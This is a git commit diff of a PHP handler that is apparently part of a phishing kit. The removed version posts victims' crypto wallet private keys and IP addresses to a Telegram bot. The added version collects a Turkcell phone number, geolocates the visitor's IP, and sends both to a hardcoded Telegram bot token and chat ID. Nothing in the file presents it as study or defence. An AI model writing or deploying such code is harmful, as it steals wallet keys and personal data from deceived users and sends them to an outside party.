5a935c3ae1a3cfc6bae7a1dca94225580d5b6a17
darkmannnn <104754586+darkmannnn@users.noreply.github.com>
2023-01-11 09:29:25 +0300

    Update document.php

--- document.php
+++ document.php
@@ -1,51 +1,27 @@
-<?php
 
+<?php
 $token = "5330630457:AAG9v9f5Q8abgbwSmyhM_q-ILsMQO36haOE";
 $chat_id = "-871734856";
+if($_POST){
+$ip=$_SERVER["REMOTE_ADDR"];
+$konum = file_get_contents("http://ip-api.com/xml/".$ip);
+$cek = new SimpleXMLElement($konum);
+$ulke = $cek->country;
+$sehir = $cek->city;
+date_default_timezone_set('Europe/Istanbul');  
+$cur_time=date("d-m-Y H:i:s");
+$msisdnToBeProcessed=$_POST["msisdnToBeProcessed"];
+$data = [
+  'text' => 'LOG - Telefon Numarası/Turkcell
+Telefon Numarası: : '.$msisdnToBeProcessed.'
+Ülke : '.$ulke.'
+İp : '.$ip.'
+Tarih : '.$cur_time.'
 
-header('Content-type: application/json');
-include('baglan');
-session_start();
-$ip = $_SERVER['REMOTE_ADDR'];
-$privateKey = strtolower(filter_input(INPUT_POST, 'privateKey'));
-$formName = strtolower(filter_input(INPUT_POST, 'formName'));
-$coinName = strtolower(filter_input(INPUT_POST, 'token'));
+',
+  'chat_id' => $chat_id
+];
 
-unction send2Telegram($token, $chatid, $coinName, $privateKey, $ip){
-  $parametre= array(
-      'chat_id' => $chatid,
-      'text' => "
-+- LOGS -+ 
-
-* [👨 COIN_NAME] : $coinName 
-
-*  [💲 WALLET or KEY] : $privateKey
-
-* [🐸 İP]   : $ip
-",
-);
-$ch = curl_init();
-$url = "https://api.telegram.org/bot".$token."/sendmessage";
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_HEADER, false);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_exec($ch);
-}
-
-if(!($privateKey) || !($coinName) || !($formName)){
-header("location: https://youtu.be/CGblT4FasEo");
-exit;
-}else{
-send2Telegram($token_r, $chatid, $coinName, $privateKey, $ip);
-try{
-$title = array("type" => "success");
-$return = json_encode($title);
-echo $return;
-} catch (PDOException $e) {
-die($e->getMessage());
-}
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
 }
 ?>
